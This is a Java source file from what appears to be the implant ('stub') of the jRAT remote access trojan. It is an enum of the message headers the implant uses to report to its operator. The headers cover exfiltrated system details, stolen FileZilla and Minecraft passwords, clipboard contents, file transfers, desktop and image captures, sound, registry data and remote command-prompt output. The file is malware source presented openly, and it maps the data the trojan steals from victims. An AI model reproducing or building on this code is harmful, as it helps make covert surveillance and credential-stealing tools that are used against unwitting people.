package pro.jrat.stub.packets;

public enum OutgoingHeader {

	INIT_DATE(/* "DATE" */(byte) 31),
	INIT_VERSION(/* "VERSION" */(byte) 30),
	INIT_COMPUTER_NAME(/* "COMPUTERNAME" */(byte) 14),
	INIT_OS_NAME(/* "OSNAME" */(byte) 16),
	INIT_SERVER_ID(/* "SERVERID" */(byte) 15),
	INIT_USERNAME(/* "USERNAME" */(byte) 22),
	INIT_SERVER_PATH(/* "SERVERPATH" */(byte) 23),
	INIT_JAVA_VERSION(/* "JAVAVER" */(byte) 25),
	INIT_JAVA_PATH(/* "JAVAPATH" */(byte) 26),
	INIT_LOCAL_IP(/* "LOCALIP" */(byte) 28),
	INIT_COUNTRY(/* "COUNTRY" */(byte) 47),
	INIT_LOCALE(/* "LOCALE" */(byte) 10),
	INIT_PASSWORD(/* "PASS" */(byte) 1),
	INIT_DRIVES(/* "DRIVES" */(byte) 62),

	INIT_RAM(/* "RAM" */(byte) 63),
	INIT_AVAILABLE_PROCESSORS(/* "APS" */(byte) 64),
	INIT_MONITORS(/* "MONITOR" */(byte) 61),

	PONG(/* "PONG" */(byte) 0),
	CLIPBOARD(/* "CBOARDC" */(byte) 41),
	CUSTOM_DIRECTORY(/* "DIR" */(byte) 34),
	PASSWORD_FILEZILLA(/* "FZ" */(byte) 48),
	ERROR_LOG(/* "ERRLOG" */(byte) 65),
	SEND_FILE(/* "FILE" */(byte) 29),
	HOST_FILE(/* "HOSTF" */(byte) 38),
	RAM(/* "HERERAM" */(byte) 24),
	CONFIG(/* "CONFIG" */(byte) 66),
	UTORRENT(/* "UTOR" */(byte) 40),
	IMAGE_PREVIEW(/* "IC" */(byte) 43),
	IP_CONFIG(/* "IPC" */(byte) 50),
	JAVA_PROPERTIES(/* "JVM" */(byte) 44),
	NETWORK_ADAPTER(/* "ADAPT" */(byte) 56),
	LIST_FOLDERS(/* "FOLDERLIST" */(byte) 19),
	LIST_THUMBNAILS(/* "IMGLIST" */(byte) 59),
	INSTALLED_PROGRAMS(/* "INSTPROG" */(byte) 55),
	PROCESS(/* "PROCESS" */(byte) 20),
	WINDOWS_SERVICE(/* "WINSER" */(byte) 52),
	REGISTRY_STARTUP(/* "REGSTART" */(byte) 53),
	MD5(/* "MD5" */(byte) 46),
	PLUGINS(/* "PLUGIN" */(byte) 67),
	VARIABLES_PROPERTIES(/* "VARPROP" */(byte) 32),
	SOUND(/* "SO" */(byte) 58),
	PASSWORD_MINECRAFT(/* "MC" */(byte) 36),
	FILE_PREVIEW(/* "FC" */(byte) 42),
	INSTALLED_LOCALES(/* "INSTLOCALES" */(byte) 11),
	REGISTRY(/* "REG" */(byte) 54),
	ACTIVE_PORT(/* "APORT" */(byte) 51),
	LAN(/* "LAN" */(byte) 49),
	COMMAND_PROMPT(/* "CMD" */(byte) 21),
	ERROR(/* "ERROR" */(byte) 60),
	FOUND_FILE(/* "FF" */(byte) 37),
	CHAT(/* "CHAT" */(byte) 35),
	DISCONNECT(/* "DISCONNECT" */(byte) 12),
	SINGLE_IMAGE_COMING(/* "SINGLEIMAGECOMING" */(byte) 18),
	IMAGE_COMING(/* "IMAGECOMING" */(byte) 17),
	THUMBNAIL(/* "THUMBNAIL" */(byte) 33),
	QUICK_DESKTOP(/* "QUICKDESKTOP" */(byte) 68),
	STAT((byte) 13);

	private final byte /* String */header;

	// private Header(String header) {
	// this.header = header;
	// }

	private OutgoingHeader(byte header) {
		this.header = header;
	}

	public byte /* String */getHeader() {
		return header;
	}

}
